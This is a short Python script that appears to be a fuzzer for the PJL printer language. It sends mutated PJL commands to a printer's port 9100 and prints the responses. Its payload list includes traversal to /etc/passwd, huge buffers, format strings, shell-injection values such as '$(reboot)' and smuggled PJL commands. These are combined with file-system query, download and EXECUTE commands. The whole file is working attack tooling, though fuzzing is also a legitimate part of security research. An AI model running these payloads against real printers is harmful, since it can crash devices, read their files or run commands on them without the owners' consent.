#!/usr/bin/env python3
"""PJL command fuzzer — sends mutations to port 9100"""
import socket
import time
import itertools

TARGET = "<printer-ip>"
PORT = 9100
TIMEOUT = 5

UEL = b"\x1b%-12345X"

PJL_COMMANDS = [
    b"@PJL INFO {var}\r\n",
    b"@PJL SET {var}={val}\r\n",
    b"@PJL FSQUERY NAME=\"{path}\"\r\n",
    b"@PJL FSDIRLIST NAME=\"{path}\" ENTRY={n} COUNT={c}\r\n",
    b"@PJL FSDOWNLOAD NAME=\"{path}\" SIZE={n}\r\n",
    b"@PJL EXECUTE NAME=\"{path}\"\r\n",
]

FUZZ_VALUES = [
    b"A" * 1024,
    b"A" * 65535,
    b"../../../etc/passwd",
    b"0:\\" + b"A" * 256,
    b"" ,
    b"\x00" * 64,
    b"\xff" * 64,
    b"%s" * 20,
    b"$(reboot)",
    b"`reboot`",
    b"-1",
    b"4294967295",
    b"\r\n@PJL INFO ID\r\n",  # injection
]

def send_pjl(cmd_bytes):
    pkt = UEL + cmd_bytes + UEL + b"\r\n"
    try:
        s = socket.socket()
        s.settimeout(TIMEOUT)
        s.connect((TARGET, PORT))
        s.send(pkt)
        resp = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        s.close()
        return resp
    except Exception as e:
        return f"ERROR: {e}".encode()

count = 0
for template in PJL_COMMANDS:
    for fval in FUZZ_VALUES:
        # Replace first placeholder with fuzz value
        cmd = template
        for placeholder in [b"{var}", b"{val}", b"{path}", b"{n}", b"{c}"]:
            cmd = cmd.replace(placeholder, fval, 1)
        
        resp = send_pjl(cmd)
        count += 1
        print(f"[{count}] CMD: {cmd[:60]!r}")
        if resp:
            print(f"       RESP: {resp[:120]!r}")
        time.sleep(0.2)  # don't hammer faster than the printer can queue
